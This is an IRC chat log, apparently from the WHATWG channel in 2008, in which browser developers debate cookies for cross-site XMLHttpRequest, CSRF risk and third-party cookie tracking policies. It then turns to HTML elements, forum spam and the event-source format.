Hixie: knowing that we can never turn off third-party cookies for <iframe> might affect the XHR cookie discussion

[14:14:01.0000] <jruderman>
so thanks

[14:14:02.0000] <Hixie>
np

[14:14:03.0000] <annevk>
Hixie, you could prolly use piechart or something

[14:15:00.0000] <Hixie>
jruderman: fwiw, google basically also couldn't use cross-domain xhr ("xxx") without cookies either

[14:15:01.0000] <annevk>
though you'd still have to pull the data through XHR, parse it, and feed it

[14:16:00.0000] <Hixie>
rendering the chart isn't hard

[14:16:01.0000] <jruderman>
how does "cross-domain xhr" become "xxx"?

[14:16:02.0000] <Hixie>
i just hoped someone had done it for me

[14:16:03.0000] <Hixie>
jruderman: "CROSS-domain eXtensions to Xmlhttprequest"

[14:17:00.0000] <jruderman>
that's cheating, the second x is 'extensions' and the third is really 'extensible'

[14:18:00.0000] <Hixie>
bacronyms are all about cheating

[14:18:01.0000] <jruderman>
hehe

[14:18:02.0000] <jruderman>
bbiab

[14:28:00.0000] <annevk>
ok, put a non-fascist header proposal up

[14:28:01.0000] <annevk>
(i did it before, but this one has its own subject line)

[14:30:00.0000] <annevk>
> What about Titanic? How should I mark that up?

[14:30:01.0000] <annevk>
<xhtml2>

[14:32:00.0000] <annevk>
By the way, the Mozilla discussion jesse outlines above (especially with the <iframe> remark) reminds of the discussion we had at Opera on this very subject

[14:52:00.0000] <jruderman>
turns out the meeting in 3 minutes is about cross-site XHR issues other than cookies. dveditz and sicking might join this channel at some point today to discuss cookies.

[14:52:01.0000] <annevk>
ok

[14:53:00.0000] <annevk>
i probably will be asleep but I guess Hixie will be around

[14:53:01.0000] <sicking>
well, you're awake now :)

[14:53:02.0000] <sicking>
so lets shoot the shit :)

[14:53:03.0000] <annevk>
hehe, sure

[14:54:00.0000] <annevk>
is the challenger here yet? :)

[14:54:01.0000] <sicking>
who?

[14:54:02.0000] <annevk>
jruderman said that dveditz was the guy who was against

[14:55:00.0000] <annevk>
or do you need convincing too now?

[14:55:01.0000] <sicking>
and window and tyler

[14:56:00.0000] <Hixie>
the reasons to include cookies are simple -- if we don't have them, we (google) basically can't use xhr.

[14:56:01.0000] <Hixie>
and would have to continue using our existing hacks.

[14:56:02.0000] <sicking>
the reason is simple and everyone agrees it has value

[14:56:03.0000] <annevk>
there's also plenty of precedent for cookies in safe and unsafe (just POST though) requests

[14:57:00.0000] <sicking>
so here's the worry:

[14:57:01.0000] <annevk>
<img>, <iframe>, <script>, <form>, 'background', 'list-style-image', 'content'

[14:57:02.0000] <annevk>
<link>

[14:57:03.0000] <sicking>
people are worried basically about misconfigured servers

[14:58:00.0000] <jruderman>
annevk: we have disabled cookies for <img> and most of those things, except for <iframe>

[14:58:01.0000] <jruderman>
annevk: dveditz believes safari has disabled cookies for third-party iframes too

[14:59:00.0000] <Hixie>
jruderman: third-party ones are a different matter, though that would still suck

[14:59:01.0000] <roc>
now you can confirm that belief!

[14:59:02.0000] <Hixie>
if we don't include the cookie headers, we have to ask ourselves, why bother with the api at all

[15:00:00.0000] <sicking>
so a site admin will enable AC (by replying to OPTIONS and/or include the appropriate headers/PIs for GETs). But they would think that because a user makes a request, that the user also has authorized the request

[15:00:01.0000] <annevk>
(third-party iframe versus cross-document iframe; is there a difference?)

[15:00:02.0000] <Hixie>
then they'd be wrong

[15:01:00.0000] <sicking>
whereas in reality the user might simply have visited another site and the site made the request

[15:01:01.0000] <sicking>
exactly, they'd be wrong, but the worry is that it's an easy mistake to make

[15:01:02.0000] <Hixie>
easy mistake to fix, too

[15:01:03.0000] <sicking>
it happens with CSRF all the time now

[15:01:04.0000] <Hixie>
yup

[15:01:05.0000] <jruderman>
dveditz!

[15:01:06.0000] <annevk>
(oh, is third-party iframe the cross-domain case where document.domain doesn't match?)

[15:02:00.0000] <annevk>
(actually, never mind, you don't know that upfront... duh)

[15:03:00.0000] <annevk>
jruderman, just cookies or also HTTP authentication?

[15:03:01.0000] <sicking>
whereas if we didn't send auth/cookies then the user would have to give the thirdparty site their username/passwd which means that the AC site can in fact rely on that the user has allowed the site to use his credentials

[15:04:00.0000] <Hixie>
giving the third party site their credentials intentionally is worse than anything else that has been suggested as a problem so far

[15:04:01.0000] <Hixie>
by many many orders of magnitude

[15:04:02.0000] <sicking>
so it's not about if this opens new vectors or not. It's worry about that web admins realize what these request actually means

[15:04:03.0000] <Hixie>
we're desperately trying to teach people NOT to give their credentials to anyone

[15:04:04.0000] <Hixie>
and here you're saying go ahead, give them

[15:04:05.0000] <sicking>
i agree

[15:05:00.0000] <Hixie>
that would be a disaster of epic proportions

[15:05:01.0000] <sicking>
it's how things work today

[15:05:02.0000] <Hixie>
operas would be written to describe how bad this is

[15:05:03.0000] <sicking>
haha

[15:05:04.0000] <sicking>
i can't do anything but agree

[15:06:00.0000] <sicking>
the example we used was linkedin.com wanting to pull down my address book from gmail

[15:06:01.0000] <sicking>
they have that feature today

[15:07:00.0000] <sicking>
and require that you give them your google user/passwd

[15:07:01.0000] <Hixie>
yes, which is horrific

[15:07:02.0000] <Hixie>
and probably violates our ToS

[15:07:03.0000] <Hixie>
five ways from sunday

[15:07:04.0000] <dveditz>
yes

[15:07:05.0000] <dveditz>
but the alternative, sending cookies, potentially enables CSRF

[15:08:00.0000] <annevk>
only if the app opts in to it

[15:08:01.0000] <Hixie>
i'd take the potential for CSRF, avoidable relatively easily, over asking people to give away their credentials

[15:08:02.0000] <dveditz>
(lumping http auth in with cookies for now)

[15:08:03.0000] <dveditz>
annevk: what do you mean by "opts in"

[15:08:04.0000] <jruderman>
does it enable CSRF that isn't already possible today?

[15:09:00.0000] <dveditz>
use the "block 3rd party cookies" options to control it?

[15:09:01.0000] <jruderman>
or does it encourage site authors to build more things that might be vulnerable to CSRF?

[15:09:02.0000] <annevk>
cross-site DELETE is not possible today

[15:09:03.0000] <annevk>
but in order for that to work the server first has to reply positively to a preflight OPTIONS request

[15:09:04.0000] <jruderman>
dveditz: i'm sorry, i don't really remember the objections to sending cookies you and others brought up last week

[15:10:00.0000] <annevk>
cross-site GET is possible today already, so there are no new CSRF issues there afaict

[15:10:01.0000] <jruderman>
only a small number of sites will respond to OPTIONS requests, and hopefully those sites are run by people who have their shit together and know how to avoid CSRF

[15:10:02.0000] <dveditz>
My objection was to giving XSXHR an exemption from the "block 3rd party cookies" pref

[15:11:00.0000] <dveditz>
if the user says "allow 3rd party cookies" then fine, send them

[15:11:01.0000] <jruderman>
iframes are already exempt, so that pref doesn't really mean much as is

[15:11:02.0000] <sicking>
so the thing is that CSRF today is kind of a catastrophy. There are lots and lots and lots of sites that are susceptible to it. If we had a world where cookies weren't sent for thirdparty requests we'd be in a much safer web

[15:11:03.0000] <Hixie>
well, imho the "block 3rd party cookies" pref should be dropped, so...

[15:11:04.0000] <dveditz>
iframes are exempt in Mozilla because we're broken

[15:11:05.0000] <sicking>
so creating another technology like it is a bad idea

[15:11:06.0000] <Hixie>
sicking: not if we cause people to send credentials to other sites

[15:11:07.0000] <dveditz>
but Safari, IE7 and Opera appear to apply the option correctly

[15:11:08.0000] <Hixie>
sicking: then we'd be in a horrendously worse place

[15:12:00.0000] <Hixie>
(as noted, this is already starting)

[15:12:01.0000] <jruderman>
sicking: i don't see how you could avoid "sending cookies for third-party requests" if you include top-level loads...

[15:12:02.0000] <sicking>
jruderman, yes, that is a problem

[15:12:03.0000] <Hixie>
dveditz: sites like paypal.com already work around the third-party cookie restrictions

[15:13:00.0000] <Hixie>
dveditz: (by redirecting all traffic through the third-party)

[15:13:01.0000] <Hixie>
dveditz: all that this pref is doing is making the user's experience slower

[15:13:02.0000] <Hixie>
dveditz: it's not actually helping anything

[15:13:03.0000] <sicking>
jruderman, my point is that clearly the technologies we have today are too complex, so the argument "it's no more complex than what we have today" is a bad argument

[15:13:04.0000] <dveditz>
Hixie: apparently public opinion is against you -- IE7 and Safari block them by default

[15:14:00.0000] <dveditz>
and people are upset that Firefox hid the pref option

[15:14:01.0000] <Hixie>
dveditz: public opinion is often against me. that doesn't make them right.

[15:14:02.0000] <sicking>
Hixie, the third-party cookie pref is mostly to prevent tracking. It does help with that. It also breaks a lot of other things

[15:14:03.0000] <Hixie>
sicking: it doesn't help with that to any significant degree

[15:14:04.0000] <Hixie>
sicking: as noted, sites that want to do tracking (e.g. paypal) just redirect all clicks through the third party directly

[15:15:00.0000] <sicking>
Hixie, it does prevent ad servers from tracking me across the web

[15:15:01.0000] <Hixie>
sicking: doubleclick disagrees

[15:15:02.0000] <Hixie>
sicking: they are tracking you quite happily without it

[15:15:03.0000] <Hixie>
sicking: it just slows down your browsing

[15:15:04.0000] <sicking>
Hixie, how? The thing is that they have no concept of identity across sites

[15:16:00.0000] <Hixie>
sicking: paypal redirects most of its links through doubleclick, so that it's a first-party cookie.

[15:16:01.0000] <sicking>
other than possibly using my IP, which is unreliable because of NAT

[15:16:02.0000] <Hixie>
sicking: and paypal knows who you are, they have your bank account number / credit card number / e-mail / name / etc.

[15:16:03.0000] <sicking>
Hixie, the thing is that if nytimes.com, google.com, paypal.com all use ads from doubleclick, doubleclick can know i'm the same guy on all three sites

[15:16:04.0000] <Hixie>
sicking: google similarly redirects all ad clicks through its servers (though in this case not for user tracking purposes, but that's only because we avoid that kind of behaviour)

[15:17:00.0000] <Hixie>
sicking: and doubleclick can know that _anyway_, just by having those sites redirect all links through them

[15:17:01.0000] <Hixie>
sicking: which they are doing, at least with paypal, and probably many other sites

[15:18:00.0000] <Hixie>
sicking: all you are doing by having the third-party cookie pref is making the user's life harder (can't copy links easily, browsing is slower, user has a false sense of security), without actually reducing any actual privacy leak

[15:18:01.0000] <sicking>
Hixie, once I click they can know it's me, but not otherwise (assuming good 3rd party cookie blocking was there)

[15:19:00.0000] <Hixie>
sicking: so you never click on anything? that would make you an irrelevant case, since you'd be the only user to fall into that behaviour pattern.

[15:19:01.0000] <sicking>
Hixie, ok, so i guess if nytimes directed all clicks on the whole site through doubleclick they could track me. Are they?

[15:19:02.0000] <Hixie>
sicking: paypal is.

[15:19:03.0000] <Hixie>
as i keep saying :-)

[15:19:04.0000] <sicking>
Hixie, even clicks on articles

[15:20:00.0000] <Hixie>
i don't know what nyt is doing, but paypal certainly is doing this, and i doubt very much that they're the only doubleclick customer doing it

[15:21:00.0000] <sicking>
paypal points all their internal links at doubleclick? That sounds horrible security wise

[15:21:01.0000] <sicking>
they're a bank!

[15:21:02.0000] <Hixie>
i've been saying this for the entire conversation, yes

[15:21:03.0000] <sicking>
sorry, there were too many conversations and topics at the start

[15:22:00.0000] <sicking>
well, so it's still doably but require horrible sacrifices. And it gets really complicated if you have multiple things wanting to track you

[15:22:01.0000] <sicking>
anyway, this is the reason that people want 3rd party cookies disabled

[15:22:02.0000] <gavin>
I don't see any links that point to doubleclick when I use paypal

[15:22:03.0000] <sicking>
personally i don't care about being tracked

[15:23:00.0000] <jruderman>
oh, i thought that when you said "paypal does this" you meant paypal uses redirects through the site they're processing a payment for, not through doubleclick

[15:23:01.0000] <gavin>
oh, there are some that point to https://paypalssl.doubleclick.net/

[15:23:02.0000] <annevk>
is 3rd party cookies disabled by default?

[15:24:00.0000] <Hixie>
gavin: my understanding is that they do it for a sample of their users, but i honestly have no idea what the details are. it's pretty well documented though, e.g. http://www.grc.com/securitynow.htm#119

[15:25:00.0000] <dveditz>
annevk: we have blocked them in FF3b3

[15:25:01.0000] <dveditz>
but a couple of sites did break

[15:25:02.0000] <sicking>
annevk, 3rd party cookies is disabled by default in FF3b3, in safari and in IE7 (sort of)

[15:26:00.0000] <dveditz>
blocking appears to be the default in Safari and IE7 (though with the right p3p policy IE7 will send you 3rd party cookies, and quite possibly the adservers use policies)

[15:26:01.0000] <Hixie>
anyone who wants to track people across the web can trivially do so at this point, even without cookies

[15:26:02.0000] <Hixie>
i think the idea of blocking third party cookies is archaic and paranoid, and makes people feel safe when they should be realising that they are being tracked

[15:26:03.0000] <sicking>
Hixie, how? The issue of identity is really hard without cookies, and globalStorage i guess

[15:27:00.0000] <dveditz>
... says the guy who though <a ping> was a good idea...

[15:27:01.0000] <othermaciej>
Safari blocks receiving third-party cookies but not sending

[15:27:02.0000] <sicking>
Hixie, cookies gives your browser an identity. Without it you can have whatever identity you choose anywhere

[15:27:03.0000] <othermaciej>
our control over cookies is solely on the accepting side

[15:27:04.0000] <Hixie>
sicking: you can pretty easily "fingerprint" people through things like their user-agent string, ip address, screen size, other js- and http- accessible prefs, etc

[15:28:00.0000] <Hixie>
sicking: and then with a simple set of analysis scripts you can easily work out who is who

[15:28:01.0000] <Hixie>
just look at the "anonymised" search query string data aol released

[15:28:02.0000] <Hixie>
people were about to track down individual users from that

[15:28:03.0000] <dveditz>
othermaciej: how does that help anything?

[15:28:04.0000] <annevk>
othermaciej, how does receiving matter for cross-site currently possible?

[15:29:00.0000] <Hixie>
if a bunch of sites cooperate, you can trivially be tracked across the web

[15:29:01.0000] <othermaciej>
dveditz: keeps an ad server from tracking you (unless you visit the site it is serving from directly)

[15:29:02.0000] <dveditz>
but once you've been there (ever in your life) they can track you

[15:29:03.0000] <sicking>
othermaciej, it's easy to direct a user through doubleclick once though

[15:29:04.0000] <dveditz>
if you're sending 3rd party

[15:29:05.0000] <sicking>
othermaciej, and once the cookie is set you're hosed

[15:29:06.0000] <othermaciej>
yes, but most people don't go to http://doubleclick.net

[15:29:07.0000] <dveditz>
unless I'm misunderstanding

[15:29:08.0000] <annevk>
othermaciej, I, I see now

[15:29:09.0000] <Hixie>
sicking: it's easier to redirect a user through doubleclick every time

[15:30:00.0000] <Hixie>
sicking: than to do it once

[15:30:01.0000] <sicking>
othermaciej, so you block on links too?

[15:30:02.0000] <dveditz>
sicking: you can't block on links, those turn into "first party" pages

[15:30:03.0000] <othermaciej>
sicking: we don't, so you could use that to work around it

[15:30:04.0000] <dveditz>
(unless a target is set)

[15:30:05.0000] <othermaciej>
I'm just explaining what the policy actually is

[15:30:06.0000] <Hixie>
(also, all this assumes that cookies are particularly reliable as a tracking method, which, frankly, they're not. there's a huge amount of "cookie churn" which makes tracking users quite difficult in practice.)

[15:30:07.0000] <othermaciej>
not necessarily claiming that it is perfect or even good

[15:30:08.0000] <sicking>
othermaciej, right, that seems trivial

[15:30:09.0000] <othermaciej>
since dveditz seemed to misunderstand it

[15:30:10.0000] <sicking>
othermaciej, heh :)

[15:31:00.0000] <sicking>
othermaciej, yeah, that helps a lot

[15:31:01.0000] <sicking>
(you explaining that is)

[15:31:02.0000] <sicking>
personally i think the whole issue is sort of silly and doomed to fail

[15:31:03.0000] <sicking>
othermaciej, do you block for <iframe>s too?

[15:32:00.0000] <Hixie>
sicking: that's what i've been saying :-)

[15:33:00.0000] <Hixie>
dump the pref, move on, tell the people who complain that they are being tracked whether they send cookies or not, and that they should find better ways to anonymise themselves (e.g. block cookies to all sites except those they enable, and use tor as their network)

[15:33:01.0000] <sicking>
well, i'm not in charge :)

[15:34:00.0000] <othermaciej>
sicking: block accepting? yes

[15:34:01.0000] <sicking>
othermaciej, cool

[15:34:02.0000] <othermaciej>
as far as I know our policy doesn't break any sites

[15:34:03.0000] <othermaciej>
we block accepting on third-party redirects too

[15:34:04.0000] <sicking>
yeah, seems much less likely to break anything. But also seems less likely to stop tracking

[15:34:05.0000] <jruderman>
Hixie++

[15:34:06.0000] <annevk>
/me hopes that this crap either goes away or that someone documents it

[15:35:00.0000] <annevk>
so i guess i tend to agree with Hixie and sicking since i don't have much hope in the latter

[15:35:01.0000] <dveditz>
othermaciej: what do you mean by 3rd party redirect? paypal.com -> doubleclick.com -> paypal.com wouldn't accept cookies from doubleclick?

[15:35:02.0000] <sicking>
/me hands annevk a cookie

[15:35:03.0000] <othermaciej>
dveditz: that's right

[15:36:00.0000] <dveditz>
but what if you end up on a 3rd party site?

[15:36:01.0000] <dveditz>
legitimately, like "getfirefox.com -> mozilla.com"

[15:37:00.0000] <dveditz>
or google.com -> google.de based on geolocation

[15:37:01.0000] <sicking>
so anyhow, back to Access-Control and cross site xmlhttprequest

[15:37:02.0000] <othermaciej>
then mozilla.com can't set a cookie

[15:37:03.0000] <Hixie>
interesting, that means dreamhost referrals don't work on safari

[15:37:04.0000] <dveditz>
I guess users could reload on the new site if something wasn't working

[15:38:00.0000] <dveditz>
Hixie: they would once you had the cookie

[15:38:01.0000] <Hixie>
you can't get the cookie

[15:38:02.0000] <sicking>
uh, so you don't allow setting cookies even on links?

[15:38:03.0000] <Hixie>
you get it on a redirect

[15:39:00.0000] <othermaciej>
we allow setting cookies on links (obviously, or you'd never get any cookies)

[15:39:01.0000] <Hixie>
oh, then it'll work

[15:39:02.0000] <Hixie>
nevermind

[15:39:03.0000] <sicking>
so anyhow, back to Access-Control and cross site xmlhttprequest. So the worry was that we'd end up with a bunch of sites having CSRF issues because they don't understand that cookie!=authorization

[15:39:04.0000] <annevk>
what about <a>.click() then?

[15:41:00.0000] <annevk>
sicking, sites would first have to become aware of Access Control for that to happen in which case they're informed

[15:42:00.0000] <othermaciej>
I don't know if anyone has thought of using <a>.click() as a redirect but I suppose that would be a hole in the policy (though we could treat it as a client-side redirect)

[15:42:01.0000] <sicking>
annevk, the argument is that enabling != being informed

[15:42:02.0000] <sicking>
annevk, which i think is true

[15:42:03.0000] <sicking>
to some extent

[15:43:00.0000] <othermaciej>
would it create CSRF issues for sites that don't change to support Access Control, besides ones they have already?

[15:43:01.0000] <dveditz>
and maybe now would be a good time to unlump http auth -- AFAIK no one has a "block 3rd-party auth" pref

[15:43:02.0000] <Hixie>
gosh, whatever will we do, we can never enable <form>s, what if people don't expect a third-party form submission?

[15:43:03.0000] <othermaciej>
it seems like not

[15:44:00.0000] <sicking>
if you don't explicitly enable access-control it doesn't matter either way

[15:44:01.0000] <sicking>
right

[15:44:02.0000] <sicking>
Hixie, well, you can make a good case for that <form>s should not have been allowed to be cross-site. Ideally <form>s should use AC imo

[15:44:03.0000] <othermaciej>
in which case it seems safe

[15:45:00.0000] <othermaciej>
(I don't think "content authors could make mistakes" is a reason to defang the feature, that risk exists with any opening of cross-site access, but we nontheless accept it is useful)

[15:45:01.0000] <sicking>
i'd say the only reason we allow cross-site <form>s today is that not doing so would break the web

[15:45:02.0000] <Hixie>
sicking: there's healthy paranoia, and then there's paralysing paranoia that stifles progress

[15:46:00.0000] <Hixie>
sicking: i'm arguing you're in the second camp right now

[15:46:01.0000] <sicking>
Hixie, yup, i agree

[15:48:00.0000] <dveditz>
I think XS-XHR should be treated as any other 3rd party load wrt cookies -- block them if you block them, allow them if allowed

[15:48:01.0000] <dveditz>
treating them in a special way will confuse users

[15:48:02.0000] <sicking>
well

[15:49:00.0000] <sicking>
users are already confused i'd say

[15:49:01.0000] <othermaciej>
most users do not have conscious awareness of cookies and how they work

[15:49:02.0000] <sicking>
even we didn't understand the safari policy

[15:49:03.0000] <sicking>
exactly

[15:49:04.0000] <dveditz>
sicking: true, but we're also not Safari users

[15:49:05.0000] <sicking>
if you say confuse servers then i could buy that

[15:49:06.0000] <annevk>
i didn't know shit about this crazy cookie policies

[15:49:07.0000] <othermaciej>
cookie preferences and restrictions are only useful for experts who are at the extreme of caring about privacy

[15:49:08.0000] <annevk>
/me thought cookies just worked

[15:49:09.0000] <annevk>
s/this/these/

[15:49:10.0000] <sicking>
but we know a whole lot more about cookies than the average safari user

[15:49:11.0000] <dveditz>
if I'm a <foo> user and I tell <foo> to block 3rd party cookies, I'd expect it to do whatever it does the same

[15:50:00.0000] <dveditz>
whether <foo> is slightly different from <bar> doesn't really matter if i don't use browser <bar>

[15:50:01.0000] <sicking>
we already behave differently for <iframe> though

[15:50:02.0000] <sicking>
if you block it there too then i agree

[15:51:00.0000] <dveditz>
yes, treating <iframe> differently is a bug in Mozilla

[15:51:01.0000] <dveditz>
on the same principle

[15:52:00.0000] <sicking>
how about we default to what safari does and have a pref for what we're doing now?

[15:52:01.0000] <Hixie>
oh lord

[15:52:02.0000] <Hixie>
more prefs would not help matters

[15:53:00.0000] <sicking>
prefs *always* helps

[15:53:01.0000] <sicking>
it makes people happy

[15:53:02.0000] <dveditz>
prefs, prefs, prefs, prefs, wonderful prefs!

[15:53:03.0000] <Hixie>
i can't tell if you're being sarcastic or not

[15:53:04.0000] <dveditz>
I'm humming the monty python spam song

[15:53:05.0000] <dveditz>
if that helps any

[15:53:06.0000] <sicking>
:)

[15:53:07.0000] <Hixie>
how about just always allowing cookies (default) or always blocking them, with a white/black list to override the default based on user preference?

[15:53:08.0000] <annevk>
it does tell you guys are not in QA :p

[15:54:00.0000] <annevk>
what Hixie says does make a lot more sense imo, at least for users

[15:54:01.0000] <annevk>
/me -> the wire

[15:54:02.0000] <sicking>
yeah, i agree with that

[15:54:03.0000] <dveditz>
Hixie: we have that too

[15:55:00.0000] <Hixie>
dveditz: remove the rest

[15:55:01.0000] <sicking>
with the QA thing that is

[15:55:02.0000] <sicking>
/me heads to talk cookies

[15:55:03.0000] <othermaciej>
Safari has 3 options with the middle-ground default

[15:56:00.0000] <othermaciej>
people rarely have to change it

[15:56:01.0000] <othermaciej>
not accepting any cookies makes it pretty painful to use the browser

[15:56:02.0000] <othermaciej>
but at this point I'm not sure if our default policy helps all that much over accepting all cookies


2008-02-21
[16:08:00.0000] <takkaria>
Welcome, takkaria.

[16:08:01.0000] <takkaria>
You last visited: Today at 15:46

[16:08:02.0000] <takkaria>
Private Messages: Unread 0, Total 20.

[17:36:00.0000] <Hixie>
um

[17:36:01.0000] <Hixie>
this e-mail i'm replying to starts:

[17:36:02.0000] <Hixie>
"Sorry for the late reply"...

[17:37:00.0000] <Hixie>
(it's from 8 Jun 2005)

[17:48:00.0000] <Hixie>
>    Might be. I think web developer would have a parade down Main Street

[17:48:01.0000] <Hixie>
> in every major city in the world if Microsoft would just fix its

[17:48:02.0000] <Hixie>
> standards support problems.

[17:48:03.0000] <Hixie>
heh

[17:48:04.0000] <Hixie>
(-Matthew Raymond)

[18:36:00.0000] <Hixie>
topic: <address>

[18:36:01.0000] <Hixie>
any opinions?

[18:37:00.0000] <othermaciej>
it is a silly element

[18:38:00.0000] <othermaciej>
first of all, having an element dedicated just to contact info for the document seems frivolous

[18:38:01.0000] <othermaciej>
second, it steals a name that would have been well suited to an element to hold an arbitrary address

[18:38:02.0000] <othermaciej>
third, the contact info might not even be what anyone would call an address

[18:38:03.0000] <othermaciej>
I don't know if that's the kind of opinions you were looking for

[18:39:00.0000] <Hixie>
i agree with those opinions

[18:39:01.0000] <Hixie>
what do you think we should do?

[18:39:02.0000] <Hixie>
keep it, drop it, change it...?

[18:44:00.0000] <othermaciej>
I don't really have a strong opinion on that

[18:45:00.0000] <othermaciej>
I'm sure people will complain wildly if it gets redefined to be an address instead

[18:45:01.0000] <Hixie>
yeah

[18:45:02.0000] <othermaciej>
I don't know how much content uses it, or what the practical impact would be of either dropping or redefining it

[18:46:00.0000] <Hixie>
http://forums.whatwg.org/viewtopic.php?t=5 has some stats

[18:46:01.0000] <Hixie>
(quoted from irc from me)

[18:51:00.0000] <othermaciej>
my off-the-cuff opinion is that it would be better to repurpose it for addresses instead of contact info

[18:51:01.0000] <othermaciej>
but then again I am not the one who would have to deal with the resulting pitchfork-wielding mobs of standardistas

[18:52:00.0000] <Hixie>
hah

[19:00:00.0000] <eseidel>
/me nominates Hixie for the "most useful thing to web engine hackers" award

[19:00:01.0000] <eseidel>
it would only probably be your 3rd year running :)

[19:02:00.0000] <mpt>
An element just for addresses?

[19:02:01.0000] <mpt>
Would GPS coordinates count?

[22:54:00.0000] <Hixie>
for some reason it irks me that the html wg chairs call their phone meeting "the" html wg telecon

[22:55:00.0000] <Hixie>
i don't understand why

[22:55:01.0000] <Hixie>
i have nothing against people using any communication method to go through things they've planned to do and work out if they've done them or not

[22:56:00.0000] <Hixie>
it just seems to convey too much importance to that meeting

[22:56:01.0000] <Hixie>
maybe i should just be happy that they are diluting the term so much :-)

[23:31:00.0000] <webben_>
/me notes it would be useful to have a URI attribute for the cite element. anchors can't do the job, e.g. <a href="example.com">Irvine Welsh reminisces about writing <cite uri="whatever">Trainspotting</cite></a>.

[23:39:00.0000] <Hixie>
Irvin Welsh <a href="">reminisces</a> about writing <a href="whatever"><cite>Trainspotting</cite></a>.

[23:41:00.0000] <webben_>
That would be one way to do it. "reminisces" isn't especially useful link text however.

[23:42:00.0000] <webben_>
(either in terms of end-users or in terms of facilitating search)

[23:44:00.0000] <webben_>
also, that doesn't mean quite the same thing if you're pulling out bibliographic references

[23:44:01.0000] <webben_>
(that is, you can't be as sure whatever is meant to equal trainspotting as opposed to a resource discussing trainspotting.

[23:45:00.0000] <webben_>
e.g. a review

[23:51:00.0000] <webben_>
I suspect similar problems might lie behind http://ocoins.info/#id3205609417

[00:01:00.0000] <webben_>
or perhaps not: http://old.onebiglibrary.net/yale/cipolo/gcs-pcs-list/2005-June/000110.html

[04:26:00.0000] <hsivonen>
Hmm. for some reason bugzilla uses <td><strong> instead of <th>...

[04:48:00.0000] <zcorpan>
was bugzilla WYSIWYGed when it was created?

[04:54:00.0000] <hsivonen>
zcorpan: WYSIWYGed?

[04:55:00.0000] <hsivonen>
hmm. this has been fixed in Bugzilla 3.x

[04:56:00.0000] <hsivonen>
hmm. nope, it hasn't been fixed in every instance

[04:56:01.0000] <hsivonen>
oh well

[04:57:00.0000] <hsivonen>
there's now http://bugzilla.validator.nu/

[04:57:01.0000] <zcorpan>
hsivonen: crafted using a WYSIWYG program

[04:58:00.0000] <hsivonen>
zcorpan: I have no idea how the Bugzilla templates originated, but considering how many form fields there are, I doubt they were created with a WYSIWYG tool

[04:59:00.0000] <Dashiva>
What you hack in is what you get

[05:00:00.0000] <annevk>
it's probably back from the days when mozilla's front page was a table hack

[05:00:01.0000] <hsivonen>
annevk: yeah, the visible layout hasn't changed since those days

[05:01:00.0000] <hsivonen>
probably in between <b> has been bikeshedded to <strong> instead of <th>

[05:01:01.0000] <annevk>
at some point i was slightly involved in getting better markup for bugzilla, but that didn't last long

[05:28:00.0000] <zcorpan>
http://forums.whatwg.org/viewtopic.php?t=9#617 http://forums.whatwg.org/viewtopic.php?t=38&start=15#616 spam?

[05:29:00.0000] <Camaban>
probably

[05:30:00.0000] <hsivonen>
yes

[05:30:01.0000] <zcorpan>
removed

[05:38:00.0000] <annevk>
zcorpan, http://forums.whatwg.org/viewtopic.php?p=621#621 (and user too)

[05:39:00.0000] <hsivonen>
annevk: where's the payload in that spam?

[05:39:01.0000] <annevk>
www button

[05:45:00.0000] <zcorpan>
annevk: thanks

[05:46:00.0000] <zcorpan>
f.w.o has a relatively high spam to real posts ratio :(

[10:32:00.0000] <Hixie>
annevk: dude, you keep posting to a member-secret list :-P

[10:35:00.0000] <zcorpan>
hsivonen: "there" is the role definitions in http://www.w3.org/TR/xhtml-role/#s_role_module_attributes (re http://krijnhoetmer.nl/irc-logs/whatwg/20080220#l-396 )

[12:07:00.0000] <Hixie>
sure are a lot of people looking for acid3 on google

[12:07:01.0000] <jwalden>
half of them were probably me, until the URL became memorable enough that I didn't need Google :-)

[12:08:00.0000] <jwalden>
comes from doing most testing in a throwaway browser instance with completely clean state

[12:15:00.0000] <Hixie>
jwalden: no, they're from all over the world

[12:15:01.0000] <jwalden>
I was being facetious

[12:16:00.0000] <Hixie>
=:-)

[12:16:01.0000] <jwalden>
(and adding words with all five vowels to the dialogue)

[12:16:02.0000] <jwalden>
(and doing so again!)

[12:17:00.0000] <Philip`>
/me gives jwalden a cauliflower

[12:18:00.0000] <jwalden>
whee!

[12:18:01.0000] <Hixie>
freaks

[12:18:02.0000] <Hixie>
:-P

[12:19:00.0000] <gsnedders>
Hixie: says the guy with a spec for his own form of English :P

[12:22:00.0000] <Philip`>
http://googlemapsapi.blogspot.com/2008/02/google-maps-without-scripting.html - hmm, unescaped ampersands in example code :-(

[12:22:01.0000] <jwalden>
don't even get me started; I'm far worse with anagramming words in conversations/etc. :-)

[12:23:00.0000] <Philip`>
It's fun writing emails so that every line has precisely the same length

[12:23:01.0000] <jwalden>
yay for not sending things with the XHTML mime type

[12:23:02.0000] <jwalden>
or something

[12:45:00.0000] <Hixie>
Philip`: yeah, i do that sometimes. dbaron started me down that road.

[12:48:00.0000] <Hixie>
good lord

[12:48:01.0000] <Hixie>
/me finds an e-mail from a year ago asking him to prioritise replying to stuff from 2 years ago

[12:49:00.0000] <gsnedders>
Philip`, Hixie: freaks :P

[12:49:01.0000] <Dashiva>
Your mailbox could be used as a modern variant of message-in-a-bottle 

[12:50:00.0000] <Dashiva>
"Dear whoever is working on html when Hixie reaches this message..."

[12:55:00.0000] <jwalden>
I send an SOS to whatwg, I hope that someone will find my postMessage in a bottle...

[12:59:00.0000] <dbaron>
Hixie, could you suggest how to use google to search for messages with all lines the same length? :-P

[12:59:01.0000] <Hixie>
here's no publicly-facing ui that would let you do that

[13:15:00.0000] <takkaria>
Hixie: how big is your email backlog thesedays?

[14:03:00.0000] <Hixie>
takkaria: http://whatwg.org/issues/data.html

[14:15:00.0000] <Hixie>
ok so event-source

[14:15:01.0000] <Hixie>
we clearly want to dramatically simplify this

[14:17:00.0000] <Hixie>
right now each line is one of:

[14:17:01.0000] <Hixie>
;comment

[14:17:02.0000] <Hixie>
:command

[14:17:03.0000] <Hixie>
field: data

[14:17:04.0000] <Hixie>
(blank line)

[14:18:00.0000] <Hixie>
the current simplification results in the only 'field' being 'data' or 'message' or some such

[14:19:00.0000] <Hixie>
if you want to send arbitrary data, a system that makes it hard to fake would be good

[14:19:01.0000] <Hixie>
right now we're susceptible to people inlining strings that happen to contain newlines

[14:19:02.0000] <Hixie>
that would be bad

[14:21:00.0000] <Hixie>
we could have (length marker) (data of that length) but then we're susceptible to people using badly formed UTF-8 to make servers not realise what the length is

[14:21:01.0000] <Hixie>
hmmmmm

[14:30:00.0000] <Hixie>
hm, one useful thing would be for the event stream to include a number

